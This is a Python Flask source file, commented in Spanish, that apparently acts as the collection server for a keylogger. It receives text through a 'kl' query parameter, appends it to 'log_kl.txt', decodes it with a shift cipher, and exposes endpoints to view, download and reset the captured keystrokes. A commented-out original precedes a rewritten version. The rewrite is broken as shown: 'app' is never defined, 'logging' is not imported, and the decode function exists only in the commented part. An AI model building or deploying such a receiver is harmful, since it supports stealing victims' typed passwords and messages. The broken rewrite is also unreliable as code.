# from flask import Flask, request, send_file
# import os
# import datetime


# app = Flask(__name__)

# # Ruta al archivo de texto para almacenar los textos
# archivo_texto = 'log_kl.txt'


# def descifrar_desplazamiento(texto_cifrado, desplazamiento):
    # texto_descifrado = ""
    # for caracter in texto_cifrado:
        # # Restamos el desplazamiento para descifrar
        # texto_descifrado += chr(ord(caracter) - desplazamiento)
    # return texto_descifrado

# @app.route('/', methods=['GET'])
# def index():
    # texto_recibido = request.args.get('kl', '')
    # with open(archivo_texto, 'a') as file:
        # caracteres_escritos = file.write(texto_recibido)
        # if caracteres_escritos > 0:
            # return f"Escritura exitosa. {caracteres_escritos} caracteres fueron escritos en el archivo."
        # else:
            # return "No se pudo escribir en el archivo."

# @app.route('/reset', methods=['GET'])
# def reset():
    # try:
        # with open(archivo_texto, 'w') as file:
            # file.write(f'Reset realizado el {datetime.datetime.now()}')
        # return "El archivo ha sido reiniciado."
    # except Exception as e:
        # return f"Error al reiniciar el archivo: {str(e)}"

# @app.route('/desc', methods=['GET'])
# def descifrar():
    # try:
        # if os.path.exists(archivo_texto):
            # with open(archivo_texto, 'r') as file:
                # contenido_cifrado = file.read()
            # desplazamiento = 3  # Puedes ajustar el desplazamiento según tus necesidades
            # contenido_descifrado = descifrar_desplazamiento(contenido_cifrado, desplazamiento)
            # return contenido_descifrado
        # else:
            # return "El archivo de texto no existe."
    # except Exception as e:
        # return f"Error al descifrar el archivo: {str(e)}"


# @app.route('/l', methods=['GET'])
# def view_listado():
    # try:
        # if os.path.exists('listado.txt'):
            # with open('listado.txt', 'r') as file:
                # contenido = file.read()
            # return contenido
        # else:
            # return "El archivo de texto no existe."
    # except Exception as e:
        # return f"Error al leer el archivo: {str(e)}"

# @app.route('/v', methods=['GET'])
# def view_archivo_texto():
    # try:
        # if os.path.exists(archivo_texto):
            # with open(archivo_texto, 'r') as file:
                # contenido = file.read()
            # return contenido
        # else:
            # return "El archivo de texto no existe."
    # except Exception as e:
        # return f"Error al leer el archivo: {str(e)}"

# @app.route('/d', methods=['GET'])
# def download():
    # try:
        # if os.path.exists(archivo_texto):
            # return send_file(archivo_texto, as_attachment=True)
        # else:
            # return "El archivo de texto no existe."
    # except Exception as e:
        # return f"Error al descargar el archivo: {str(e)}"

# if __name__ == '__main__':
    # app.run(debug=True, port=os.getenv("PORT", default=5000))


from flask import Flask, request, send_file
import os
import datetime
from logging import Logger, StreamHandler, Formatter
logger = Logger(__name__)
handler = StreamHandler()
formatter = Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)
RUTA_ARCHIVO_TEXTO = 'log_kl.txt'
@app.route('/', methods=['GET'])
def index():
  """
  Recibe un mensaje por GET y lo guarda en un archivo de texto.
  """
  texto_recibido = request.args.get('kl', '')
  try:
    with open(RUTA_ARCHIVO_TEXTO, 'a') as file:
      caracteres_escritos = file.write(texto_recibido)
      if caracteres_escritos > 0:
        logger.info(f"Escritura exitosa. {caracteres_escritos} caracteres fueron escritos en el archivo.")
        return f"Escritura exitosa. {caracteres_escritos} caracteres fueron escritos en el archivo."
      else:
        logger.error("No se pudo escribir en el archivo.")
        return "No se pudo escribir en el archivo."
  except Exception as e:
    logger.exception(f"Error al escribir en el archivo: {str(e)}")
    return f"Error al escribir en el archivo: {str(e)}"
@app.route('/reset', methods=['GET'])
def reset():
  """
  Reinicia el archivo de texto.
  """
  try:
    with open(RUTA_ARCHIVO_TEXTO, 'w') as file:
      file.write(f'Reset realizado el {datetime.datetime.now()}')
      logger.info("El archivo ha sido reiniciado.")
      return "El archivo ha sido reiniciado."
  except Exception as e:
    logger.exception(f"Error al reiniciar el archivo: {str(e)}")
    return f"Error al reiniciar el archivo: {str(e)}"
@app.route('/desc', methods=['GET'])
def descifrar():
  """
  Descira el contenido del archivo de texto.
  """
  try:
    if os.path.exists(RUTA_ARCHIVO_TEXTO):
      with open(RUTA_ARCHIVO_TEXTO, 'r') as file:
        contenido_cifrado = file.read()
      desplazamiento = 3  # Ajustar según sea necesario
      contenido_descifrado = descifrar_desplazamiento(contenido_cifrado, desplazamiento)
      logger.info("El archivo ha sido descifrado.")
      return contenido_descifrado
    else:
      logger.error("El archivo de texto no existe.")
      return "El archivo de texto no existe."
  except Exception as e:
    logger.exception(f"Error al descifrar el archivo: {str(e)}")
    return f"Error al descifrar el archivo: {str(e)}"
@app.route('/l', methods=['GET'])
def view_listado():
  """
  Muestra el contenido del archivo 'listado.txt'.
  """
  try:
    if os.path.exists('listado.txt'):
      with open('listado.txt', 'r') as file:
        contenido = file.read()
      logger.info("El archivo 'listado.txt' ha sido leído.")
      return contenido
    else:
      logger.error("El archivo 'listado.txt' no existe.")
      return "El archivo 'listado.txt' no existe."
  except Exception as e:
    logger.exception(f"Error al leer el archivo 'listado.txt': {str(e)}")
    return f"Error al leer el archivo 'listado.txt': {str(e)}"
@app.route('/v', methods=['GET'])
def view_archivo_texto():
  """
  Muestra el contenido del archivo de texto.
  """
  try:
    if os.path.exists(RUTA_ARCHIVO_TEXTO):
      with open(RUTA_ARCHIVO_TEXTO, 'r') as file:
        contenido = file.read()
      logger.info("El archivo ha sido leído.")
      return contenido
    else:
      logger.error("El archivo de texto no existe.")
      return "El archivo de texto no existe."
  except Exception as e:
    logger.exception(f"Error al leer el archivo: {str(e)}")
    return f"Error al leer el archivo: {str(e)}"

@app.route('/d', methods=['GET'])
def download():
  """
  Descarga el archivo de texto.
  """
  try:
    if os.path.exists(RUTA_ARCHIVO_TEXTO):
      logger.info("El archivo ha sido descargado.")
      return send_file(RUTA_ARCHIVO_TEXTO, as_attachment=True)
    else:
      logger.error("El archivo de texto no existe.")
      return "El archivo de texto no existe."
  except Exception as e:
    logger.exception(f"Error al descargar el archivo: {str(e)}")
    return f"Error al descargar el archivo: {str(e)}"

if __name__ == '__main__':
  app.run(debug=True, port=os.getenv("PORT", default=5000))
